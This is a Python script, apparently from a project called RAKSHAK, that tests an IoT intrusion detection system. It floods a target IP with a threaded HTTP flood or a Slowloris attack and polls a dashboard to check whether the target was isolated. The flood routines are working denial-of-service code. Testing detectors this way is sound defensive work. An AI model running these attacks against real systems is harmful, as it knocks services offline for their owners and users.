#!/usr/bin/env python3
"""
DDoS Detection Testing Script
==============================

Specialized script for testing RAKSHAK's DDoS detection capabilities.
Focuses only on Denial of Service attacks with detailed monitoring.

Target: ESP32-CAM or any device on the network
Detection: Rate-based DDoS detector + IDS classifier

Author: Team RAKSHAK
"""

import argparse
import time
import requests
import socket
import threading
from datetime import datetime
from typing import Dict
import sys

# ANSI colors
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class DDoSAttacker:
    """DDoS attack testing for RAKSHAK."""

    def __init__(self, target_ip: str, dashboard_url: str = "http://localhost:5000"):
        self.target_ip = target_ip
        self.dashboard_url = dashboard_url
        self.start_time = datetime.now()
        self.isolated = False
        self.detection_time = None

    def print_banner(self):
        print(f"""
{Colors.HEADER}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════╗
║                    DDoS DETECTION TEST - RAKSHAK                         ║
╚══════════════════════════════════════════════════════════════════════════╝
{Colors.ENDC}
{Colors.OKCYAN}Target IP:{Colors.ENDC}      {self.target_ip}
{Colors.OKCYAN}Dashboard:{Colors.ENDC}     {self.dashboard_url}
{Colors.OKCYAN}Test Type:{Colors.ENDC}     HTTP Flood DDoS
{Colors.WARNING}
⚠️  This generates real attack traffic - use only on authorized test networks
{Colors.ENDC}
""")

    def check_device_status(self) -> Dict:
        """Check device status via RAKSHAK API."""
        try:
            response = requests.get(f"{self.dashboard_url}/api/devices/{self.target_ip}", timeout=2)
            if response.status_code == 200:
                data = response.json()
                if data.get("success"):
                    device = data.get("data", {})
                    return {
                        "status": device.get("status", "unknown"),
                        "isolated": device.get("status") == "isolated",
                        "risk_score": device.get("risk_score", 0)
                    }
        except:
            pass
        return {"status": "unknown", "isolated": False, "risk_score": 0}

    def monitor_thread(self, duration: int = 60):
        """Monitor device status and detection in background."""
        print(f"{Colors.OKCYAN}Monitoring started (checking every 2s)...{Colors.ENDC}\n")

        start = time.time()
        while time.time() - start < duration and not self.isolated:
            status = self.check_device_status()

            if status["isolated"] and not self.isolated:
                self.isolated = True
                self.detection_time = time.time() - start

                print(f"\n{Colors.FAIL}{'='*76}")
                print(f"🚨 DDoS DETECTED AND DEVICE ISOLATED!")
                print(f"{'='*76}{Colors.ENDC}")
                print(f"{Colors.BOLD}Detection Time:{Colors.ENDC} {self.detection_time:.1f} seconds")
                print(f"{Colors.BOLD}Risk Score:{Colors.ENDC}     {status['risk_score']}%")
                print(f"{Colors.BOLD}Status:{Colors.ENDC}         {status['status']}")
                print(f"{Colors.FAIL}{'='*76}{Colors.ENDC}\n")
                break

            time.sleep(2)

    def http_flood_attack(self, duration: int = 30, threads: int = 10):
        """
        HTTP Flood DDoS Attack

        Spawns multiple threads sending rapid HTTP requests to overwhelm the target.
        Expected detection: 50+ packets/second triggers rate-based detector
        """
        print(f"{Colors.HEADER}{Colors.BOLD}")
        print("╔══════════════════════════════════════════════════════════════════════════╗")
        print(f"║  HTTP FLOOD DDoS - {threads} THREADS × {duration} SECONDS")
        print("╚══════════════════════════════════════════════════════════════════════════╝")
        print(f"{Colors.ENDC}")

        request_counts = [0] * threads
        stop_flag = threading.Event()

        def flood_worker(worker_id):
            """Worker thread for HTTP flooding."""
            count = 0
            while not stop_flag.is_set():
                try:
                    requests.get(
                        f"http://{self.target_ip}/",
                        timeout=0.5,
                        headers={'User-Agent': f'DDoSBot-{worker_id}'}
                    )
                    count += 1
                except:
                    count += 1  # Count failed attempts too
                request_counts[worker_id] = count

        # Start worker threads
        print(f"{Colors.OKBLUE}Starting {threads} attack threads...{Colors.ENDC}")
        workers = []
        for i in range(threads):
            t = threading.Thread(target=flood_worker, args=(i,), daemon=True)
            t.start()
            workers.append(t)

        time.sleep(1)
        print(f"{Colors.OKGREEN}✓ All threads running{Colors.ENDC}\n")

        # Monitor attack progress
        attack_start = time.time()
        last_total = 0

        print(f"{Colors.BOLD}Attack Progress:{Colors.ENDC}")
        print(f"{'Time':<8} {'Requests':<12} {'Rate (req/s)':<15} {'Packet Rate*':<15} {'Status':<10}")
        print("-" * 76)

        while time.time() - attack_start < duration:
            elapsed = time.time() - attack_start
            total_requests = sum(request_counts)
            current_rate = (total_requests - last_total) / 1.0 if elapsed > 0 else 0
            avg_rate = total_requests / elapsed if elapsed > 0 else 0

            # Estimate packet rate (each HTTP request ≈ 5-10 packets)
            est_packet_rate = avg_rate * 7  # Conservative estimate

            # Color code based on detection threshold
            rate_color = Colors.OKGREEN if est_packet_rate >= 50 else Colors.WARNING

            status = "🎯 DETECTED!" if self.isolated else "Attacking..."
            status_color = Colors.FAIL if self.isolated else Colors.OKCYAN

            print(f"{elapsed:6.1f}s  {total_requests:<12} "
                  f"{rate_color}{avg_rate:6.1f} req/s{Colors.ENDC}    "
                  f"{rate_color}{est_packet_rate:6.0f} pps{Colors.ENDC}       "
                  f"{status_color}{status}{Colors.ENDC}")

            last_total = total_requests

            if self.isolated:
                break

            time.sleep(1)

        # Stop workers
        stop_flag.set()
        time.sleep(0.5)

        # Final stats
        total_requests = sum(request_counts)
        total_time = time.time() - attack_start
        final_rate = total_requests / total_time

        print("\n" + "="*76)
        print(f"{Colors.BOLD}Attack Summary:{Colors.ENDC}")
        print(f"  Total Requests:    {total_requests}")
        print(f"  Duration:          {total_time:.1f} seconds")
        print(f"  Average Rate:      {final_rate:.1f} req/s")
        print(f"  Est. Packet Rate:  {final_rate * 7:.0f} pps (* 7 packets/request)")
        print("="*76)

    def slowloris_attack(self, duration: int = 60, connections: int = 200):
        """
        Slowloris DoS Attack

        Opens many slow HTTP connections to exhaust server resources.
        Expected detection: Multiple slow connections from same source
        """
        print(f"{Colors.HEADER}{Colors.BOLD}")
        print("╔══════════════════════════════════════════════════════════════════════════╗")
        print(f"║  SLOWLORIS DOS - {connections} SLOW CONNECTIONS × {duration}s")
        print("╚══════════════════════════════════════════════════════════════════════════╝")
        print(f"{Colors.ENDC}\n")

        sockets = []

        print(f"{Colors.OKBLUE}Opening {connections} slow connections...{Colors.ENDC}")

        # Create slow connections
        for i in range(connections):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, 80))

                # Send incomplete HTTP request
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                # Don't send final \r\n to keep connection open

                sockets.append(sock)

                if (i + 1) % 50 == 0:
                    print(f"  {i+1}/{connections} connections established...")

            except Exception:
                pass

        established = len(sockets)
        print(f"{Colors.OKGREEN}✓ Established {established} slow connections{Colors.ENDC}\n")

        # Keep connections alive
        print(f"{Colors.BOLD}Maintaining connections:{Colors.ENDC}")
        print(f"{'Time':<8} {'Active':<10} {'Status':<20}")
        print("-" * 76)

        start_time = time.time()
        while time.time() - start_time < duration:
            # Send keep-alive headers
            for sock in sockets[:]:
                try:
                    sock.send(f"X-Keep-Alive: {int(time.time())}\r\n".encode())
                except:
                    sockets.remove(sock)

            elapsed = time.time() - start_time
            status = "🎯 DETECTED!" if self.isolated else "Attacking..."
            status_color = Colors.FAIL if self.isolated else Colors.OKCYAN

            print(f"{elapsed:6.1f}s  {len(sockets):<10} {status_color}{status}{Colors.ENDC}")

            if self.isolated:
                break

            time.sleep(10)

        # Close sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

        print(f"\n{Colors.OKGREEN}✓ Attack completed{Colors.ENDC}")

    def run_test(self, attack_type: str = "http_flood", **kwargs):
        """Run DDoS test with monitoring."""
        self.print_banner()

        # Check initial status
        print(f"{Colors.OKBLUE}Checking initial device status...{Colors.ENDC}")
        initial = self.check_device_status()
        print(f"  Status: {initial['status']}")
        print(f"  Risk Score: {initial['risk_score']}%")
        print(f"  Isolated: {initial['isolated']}\n")

        if initial['isolated']:
            print(f"{Colors.WARNING}⚠️  Device is already isolated!{Colors.ENDC}")
            print("Un-isolate first: curl -X POST http://localhost:5000/api/devices/{ip}/unisolate\n")
            return

        # Start monitoring
        monitor = threading.Thread(
            target=self.monitor_thread,
            args=(kwargs.get('duration', 60) + 10,),
            daemon=True
        )
        monitor.start()

        # Run attack
        if attack_type == "http_flood":
            self.http_flood_attack(
                duration=kwargs.get('duration', 30),
                threads=kwargs.get('threads', 10)
            )
        elif attack_type == "slowloris":
            self.slowloris_attack(
                duration=kwargs.get('duration', 60),
                connections=kwargs.get('connections', 200)
            )

        # Wait for monitoring to catch up
        time.sleep(5)

        # Final status
        print(f"\n{Colors.HEADER}{Colors.BOLD}")
        print("╔══════════════════════════════════════════════════════════════════════════╗")
        print("║                         TEST RESULTS")
        print("╚══════════════════════════════════════════════════════════════════════════╝")
        print(f"{Colors.ENDC}")

        final = self.check_device_status()

        print(f"{Colors.BOLD}Final Device Status:{Colors.ENDC}")
        print(f"  Status:      {final['status']}")
        print(f"  Isolated:    {final['isolated']}")
        print(f"  Risk Score:  {final['risk_score']}%")

        if self.isolated:
            print(f"\n{Colors.OKGREEN}{'='*76}")
            print(f"✅ SUCCESS! RAKSHAK DETECTED AND ISOLATED THE DDoS ATTACK")
            print(f"{'='*76}{Colors.ENDC}")
            print(f"{Colors.BOLD}Detection Time:{Colors.ENDC} {self.detection_time:.1f} seconds from attack start")
        else:
            print(f"\n{Colors.WARNING}{'='*76}")
            print(f"⚠️  WARNING: Device was not isolated")
            print(f"{'='*76}{Colors.ENDC}")
            print("\nPossible reasons:")
            print("  1. Attack rate too low (< 50 packets/s)")
            print("  2. NFQueue not processing packets (check logs)")
            print("  3. Detection threshold too high")
            print("\nCheck RAKSHAK logs:")
            print("  tail -f data/logs/rakshak.log | grep -E 'DDoS|NFQueue|Rate tracker'")

        print()


def main():
    parser = argparse.ArgumentParser(
        description="DDoS Detection Testing for RAKSHAK",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # HTTP Flood (default)
  python3 ddos_test.py --target 10.42.0.103

  # Longer attack
  python3 ddos_test.py --target 10.42.0.103 --duration 60

  # More threads for higher packet rate
  python3 ddos_test.py --target 10.42.0.103 --threads 20

  # Slowloris attack
  python3 ddos_test.py --target 10.42.0.103 --type slowloris

Detection Thresholds:
  - HTTP Flood: 50+ packets/second
  - Slowloris: 100+ simultaneous slow connections
  - Expected detection time: 10-20 seconds
        """
    )

    parser.add_argument(
        "--target",
        required=True,
        help="Target device IP address"
    )

    parser.add_argument(
        "--dashboard",
        default="http://localhost:5000",
        help="RAKSHAK dashboard URL"
    )

    parser.add_argument(
        "--type",
        choices=["http_flood", "slowloris"],
        default="http_flood",
        help="Attack type to test"
    )

    parser.add_argument(
        "--duration",
        type=int,
        default=30,
        help="Attack duration in seconds (default: 30)"
    )

    parser.add_argument(
        "--threads",
        type=int,
        default=10,
        help="Number of attack threads for HTTP flood (default: 10)"
    )

    parser.add_argument(
        "--connections",
        type=int,
        default=200,
        help="Number of slow connections for Slowloris (default: 200)"
    )

    args = parser.parse_args()

    attacker = DDoSAttacker(args.target, args.dashboard)
    attacker.run_test(
        attack_type=args.type,
        duration=args.duration,
        threads=args.threads,
        connections=args.connections
    )


if __name__ == "__main__":
    main()
